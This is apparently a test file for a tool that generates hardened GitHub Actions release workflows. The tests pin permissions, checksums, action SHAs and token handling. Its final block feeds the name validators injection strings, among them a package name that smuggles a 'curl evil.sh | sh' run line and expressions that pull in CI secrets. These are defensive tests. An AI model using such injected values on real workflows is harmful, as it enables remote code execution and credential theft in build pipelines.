import { describe, expect, test } from "vitest";
import {
  ECOSYSTEMS,
  gateSetupEcosystemOptions,
  getWorkflowGateAdapter,
} from "../../server/lib/ecosystems";
import {
  assertGateSetupEnvironment,
  assertGateSetupPackageName,
} from "../../server/lib/github-app/gate-setup";
import { GATE_SETUP_NPM_CLI_VERSION } from "../../server/lib/workflow-gates/gate-setup-actions";
import type { GateSetupTemplate } from "../../server/lib/workflow-gates/types";
import {
  GATE_WORKFLOW_EXAMPLE_ENVIRONMENT,
  GATE_WORKFLOW_EXAMPLES,
} from "../../src/pages/Docs/gate-workflow-examples";

/**
 * The setup wizard's generated workflows.
 *
 * These are the bytes a maintainer merges into their repository, so the shape
 * is pinned rather than eyeballed: the gate contract (record `SHA256SUMS`,
 * upload it with the artifacts, gate the publish job on the environment,
 * re-verify with `--check --strict`) has to survive any edit to the templates.
 */

const ENVIRONMENT = "release-gate";

function template(ecosystem: string, packageName: string): GateSetupTemplate {
  const adapter = getWorkflowGateAdapter(ecosystem);
  const build = adapter.gateSetupTemplate;
  if (!build) throw new Error(`${ecosystem} has no gateSetupTemplate`);
  return build({ environmentName: ENVIRONMENT, packageName });
}

const CASES = [
  {
    ecosystem: "npm",
    packageName: "@acme/toolkit",
    artifactName: "npm-release-candidates",
    buildJob: "pack",
    publishPermissions: { "id-token": "write" },
  },
  {
    ecosystem: "pypi",
    packageName: "acme-toolkit",
    artifactName: "pypi-release-candidate",
    buildJob: "build",
    publishPermissions: { "id-token": "write" },
  },
  {
    ecosystem: "vscode",
    packageName: "acme.toolkit",
    artifactName: "vscode-release-candidate",
    buildJob: "package",
    // Read for the lockfile the job installs vsce from; the Marketplace PAT is
    // its credential, and it gets no GitHub write or OIDC scope.
    publishPermissions: { contents: "read" },
  },
] as const;

/** Each top-level job's lines, keyed by job id. Enough YAML for these shapes. */
function jobBlocks(yaml: string): Map<string, string> {
  const jobs = new Map<string, string>();
  let current: string | null = null;
  for (const line of yaml.slice(yaml.indexOf("\njobs:\n") + 7).split("\n")) {
    const start = line.match(/^ {2}([a-z][\w-]*):\s*$/);
    if (start) {
      current = start[1];
      jobs.set(current, "");
    } else if (current) {
      jobs.set(current, `${jobs.get(current)}${line}\n`);
    }
  }
  return jobs;
}

/**
 * The job's `permissions:` scopes. A job without the key inherits the
 * workflow's top-level `permissions: {}`, which the tests pin separately.
 */
function jobPermissions(job: string): Record<string, string> {
  const lines = job.split("\n");
  const start = lines.findIndex((line) => line === "    permissions:");
  if (start === -1) return {};
  const scopes: Record<string, string> = {};
  for (const line of lines.slice(start + 1)) {
    const scope = line.match(/^ {6}([a-z-]+): (\w+)$/);
    if (scope) scopes[scope[1]] = scope[2];
    else if (!/^ {6,}#/.test(line)) break;
  }
  return scopes;
}

describe("gate setup templates", () => {
  test("every gate ecosystem ships a setup template", () => {
    const missing = ECOSYSTEMS.filter((eco) => eco.gate && !eco.gate.gateSetupTemplate).map(
      (eco) => eco.id,
    );
    expect(missing).toEqual([]);
  });

  test("exposes the wizard options from the ecosystem registry", () => {
    expect(gateSetupEcosystemOptions().map((option) => option.id)).toEqual(
      CASES.map((testCase) => testCase.ecosystem),
    );
  });

  for (const testCase of CASES) {
    describe(testCase.ecosystem, () => {
      const generated = template(testCase.ecosystem, testCase.packageName);

      test("writes under .github/workflows and names the ecosystem", () => {
        expect(generated.workflowPath).toMatch(/^\.github\/workflows\/drydock-.+\.yml$/);
        expect(generated.workflowPath).toContain(testCase.ecosystem);
      });

      test("interpolates the caller's package name and environment", () => {
        expect(generated.yaml).toContain(`name: "Publish ${testCase.packageName}"`);
        expect(generated.yaml).toContain(`environment: "${ENVIRONMENT}"`);
        // The environment must gate the *publish* job, not the build job.
        const publishIndex = generated.yaml.indexOf("  publish:");
        expect(publishIndex).toBeGreaterThan(-1);
        expect(generated.yaml.indexOf(`environment: "${ENVIRONMENT}"`)).toBeGreaterThan(
          publishIndex,
        );
      });

      test("records SHA256SUMS at build time and re-checks it before publishing", () => {
        expect(generated.yaml).toContain("sha256sum");
        expect(generated.yaml).toContain("> SHA256SUMS");
        expect(generated.yaml).toContain("sha256sum --check --strict SHA256SUMS");
        // The digest record has to be uploaded with the artifacts, or the
        // publish job has nothing to verify against.
        const recordIndex = generated.yaml.indexOf("> SHA256SUMS");
        const uploadIndex = generated.yaml.indexOf("actions/upload-artifact@");
        expect(recordIndex).toBeLessThan(uploadIndex);
      });

      test("uploads and downloads the artifact name the gate resolver looks for", () => {
        const adapter = getWorkflowGateAdapter(testCase.ecosystem);
        expect(adapter.artifactName).toBe(testCase.artifactName);
        const occurrences = generated.yaml.split(`name: ${testCase.artifactName}`).length - 1;
        expect(occurrences).toBe(2);
      });

      test("carries hardening notes that name the environment", () => {
        expect(generated.notes.length).toBeGreaterThan(0);
        expect(generated.notes.join("\n")).toContain(ENVIRONMENT);
      });

      test("grants no token scope by default and each job only what it needs", () => {
        const preamble = generated.yaml.slice(0, generated.yaml.indexOf("\njobs:\n"));
        expect(preamble).toMatch(/^permissions: \{\}$/m);
        const jobs = jobBlocks(generated.yaml);
        expect([...jobs.keys()]).toEqual([testCase.buildJob, "publish"]);
        // The build job runs third-party install/build code: read, never write,
        // and never an OIDC token.
        expect(jobPermissions(jobs.get(testCase.buildJob) ?? "")).toEqual({ contents: "read" });
        expect(jobPermissions(jobs.get("publish") ?? "")).toEqual(testCase.publishPermissions);
      });

      test("keeps the checkout token off disk", () => {
        const checkouts = generated.yaml.split("actions/checkout@").slice(1);
        expect(checkouts.length).toBeGreaterThan(0);
        for (const step of checkouts) {
          expect(step.slice(0, step.indexOf("\n      - "))).toContain("persist-credentials: false");
        }
      });

      test("pins every action to a full commit SHA", () => {
        const uses = [...generated.yaml.matchAll(/^\s*- uses: (.+)$/gm)].map((m) => m[1]);
        expect(uses.length).toBeGreaterThan(0);
        for (const ref of uses) {
          expect(ref).toMatch(/^[\w.-]+\/[\w.-]+@[0-9a-f]{40} # v\d+\.\d+\.\d+$/);
        }
      });

      test("restores no dependency cache into a release build", () => {
        const setups = generated.yaml.split("actions/setup-node@").length - 1;
        const cacheOff = generated.yaml.split("package-manager-cache: false").length - 1;
        expect(cacheOff).toBe(setups);
      });

      test("never emits an unquoted interpolation the caller could control", () => {
        // The only `${{ }}` allowed is a literal Actions expression written by
        // the template itself, never one assembled from the package name.
        for (const match of generated.yaml.matchAll(/\$\{\{([^}]*)\}\}/g)) {
          expect(match[1]).not.toContain(testCase.packageName);
        }
      });
    });
  }

  test("npm pins the OIDC trusted-publishing shape", () => {
    const generated = template("npm", "@acme/toolkit");
    expect(generated.yaml).toContain("id-token: write");
    // Trusted publishing attaches provenance on its own from a public
    // repository, and `--provenance` fails the publish from a private one.
    expect(generated.yaml).not.toContain("--provenance");
    // A token path must not exist anywhere in the file. `registry-url` writes an
    // .npmrc that expects NODE_AUTH_TOKEN, so it is as disqualifying as the
    // secret itself.
    expect(generated.yaml).not.toContain("NODE_AUTH_TOKEN");
    const keys = generated.yaml.split("\n").map((line) => line.trim());
    expect(keys.some((line) => line.startsWith("registry-url:"))).toBe(false);
    // npm's OIDC exchange needs npm >= 11.5.1; neither Node 22's bundled npm nor
    // the runner image ships it, so the publish job installs it explicitly — at
    // an exact version, because that job can mint a publish token.
    const upgrade = generated.yaml.match(/npm install -g npm@(\S+)/);
    expect(upgrade?.[1]).toMatch(/^\d+\.\d+\.\d+$/);
    const [major, minor, patch] = (upgrade?.[1] ?? "0.0.0").split(".").map(Number);
    expect(major > 11 || (major === 11 && (minor > 5 || (minor === 5 && patch >= 1)))).toBe(true);
    const upgradeIndex = generated.yaml.indexOf("npm install -g npm@");
    const publishIndex = generated.yaml.indexOf("npm publish");
    expect(upgradeIndex).toBeGreaterThan(generated.yaml.indexOf("  publish:"));
    expect(upgradeIndex).toBeLessThan(publishIndex);
  });

  test.each([
    ["npm", "@acme/toolkit", "npm pack --pack-destination dist"],
    ["vscode", "acme.toolkit", "package --out dist/extension.vsix"],
  ])("%s creates dist before writing the release artifact", (ecosystem, packageName, command) => {
    const generated = template(ecosystem, packageName);
    const createIndex = generated.yaml.indexOf("mkdir -p dist");
    const packageIndex = generated.yaml.indexOf(command);
    expect(createIndex).toBeGreaterThan(-1);
    expect(createIndex).toBeLessThan(packageIndex);
  });

  test("pypi removes the checksum file before handing dist/ to the publisher", () => {
    const generated = template("pypi", "acme-toolkit");
    const removeIndex = generated.yaml.indexOf("rm dist/SHA256SUMS");
    const publishIndex = generated.yaml.indexOf("pypa/gh-action-pypi-publish");
    expect(removeIndex).toBeGreaterThan(-1);
    expect(removeIndex).toBeLessThan(publishIndex);
  });

  test("pypi promises no shard handling the generated workflow lacks", () => {
    const generated = template("pypi", "acme-toolkit");
    // The publish job downloads the one exact artifact name and checks one
    // SHA256SUMS; telling maintainers to name shards would ship half a release.
    expect(generated.yaml).not.toContain("pattern:");
    expect(generated.notes.join("\n")).not.toContain("pypi-release-candidate-*");
  });

  test("vscode reads its Marketplace PAT from the gated environment", () => {
    const generated = template("vscode", "acme.toolkit");
    expect(generated.yaml).toContain("VSCE_PAT: ${{ secrets.VSCE_PAT }}");
    expect(generated.yaml).toContain("--packagePath dist/extension.vsix");
    expect(generated.yaml).not.toContain("id-token");
  });

  test("vscode runs vsce from the lockfile, with scripts off beside the PAT", () => {
    const generated = template("vscode", "acme.toolkit");
    // The publish job holds a PAT that outlives the run. `npx @vscode/vsce@x`
    // pins vsce but resolves its dependency ranges fresh every run, so vsce
    // is never fetched ad hoc — both jobs run the repository's locked copy.
    expect(generated.yaml).not.toContain("npx");
    expect(generated.yaml.split("./node_modules/.bin/vsce ").length - 1).toBe(2);
    const publish = jobBlocks(generated.yaml).get("publish") ?? "";
    // npm still runs a git dependency's prepare scripts under
    // --ignore-scripts, so the install refuses git dependencies too, with a
    // pinned npm 11 (npm 10 has no --allow-git).
    const install = publish.indexOf("npm ci --ignore-scripts --allow-git=none");
    expect(install).toBeGreaterThan(-1);
    expect(install).toBeLessThan(publish.indexOf("vsce publish"));
    const npmPin = publish.indexOf(`npm install -g npm@${GATE_SETUP_NPM_CLI_VERSION}`);
    expect(npmPin).toBeGreaterThan(-1);
    expect(npmPin).toBeLessThan(install);
    expect(GATE_SETUP_NPM_CLI_VERSION).toMatch(/^11\.\d+\.\d+$/);
    // The locked vsce needs a known Node (4.x wants >= 22), not the runner's.
    expect(publish.indexOf("actions/setup-node@")).toBeGreaterThan(-1);
    expect(publish.indexOf("actions/setup-node@")).toBeLessThan(install);
    expect(generated.notes.join("\n")).toContain("devDependencies");
  });
});

describe("Docs page workflow examples", () => {
  test("cover every ecosystem the wizard can generate for", () => {
    expect(Object.keys(GATE_WORKFLOW_EXAMPLES).sort()).toEqual(
      gateSetupEcosystemOptions()
        .map((option) => option.id)
        .sort(),
    );
  });

  // The Docs page tells maintainers its examples are the files the wizard
  // writes. They are copies, because the browser bundle cannot import the
  // Worker's adapters, so this is what keeps that sentence true.
  test.each(Object.entries(GATE_WORKFLOW_EXAMPLES))(
    "the %s example is the file the wizard writes",
    (ecosystem, example) => {
      const generated = getWorkflowGateAdapter(ecosystem).gateSetupTemplate?.({
        environmentName: GATE_WORKFLOW_EXAMPLE_ENVIRONMENT,
        packageName: example.packageName,
      });
      expect(
        example.yaml,
        "src/pages/Docs/gate-workflow-examples.ts drifted from the adapter template; copy the rendered YAML back",
      ).toBe(generated?.yaml);
    },
  );
});

describe("gate setup identity allowlist", () => {
  test("accepts the identifiers each ecosystem actually uses", () => {
    for (const name of ["@acme/toolkit", "acme-toolkit", "acme.toolkit"]) {
      expect(() => assertGateSetupPackageName(name)).not.toThrow();
    }
    for (const environment of ["production", "release gate", "prod_1"]) {
      expect(() => assertGateSetupEnvironment(environment)).not.toThrow();
    }
  });

  test("rejects anything that could break out of a quoted YAML scalar", () => {
    for (const hostile of [
      'a"\nrun: curl evil.sh | sh',
      "a${{ secrets.NPM_TOKEN }}",
      "a\\b",
      "a`b`",
      "",
    ]) {
      expect(() => assertGateSetupPackageName(hostile)).toThrow();
    }
    for (const hostile of ['prod"', "prod\n", "prod${{ github.token }}", ""]) {
      expect(() => assertGateSetupEnvironment(hostile)).toThrow();
    }
  });

  test("caps length so a name the template step would reject never reaches GitHub", () => {
    expect(() => assertGateSetupEnvironment("e".repeat(128))).not.toThrow();
    expect(() => assertGateSetupEnvironment("e".repeat(129))).toThrow();
    expect(() => assertGateSetupPackageName("p".repeat(214))).not.toThrow();
    expect(() => assertGateSetupPackageName("p".repeat(215))).toThrow();
  });
});
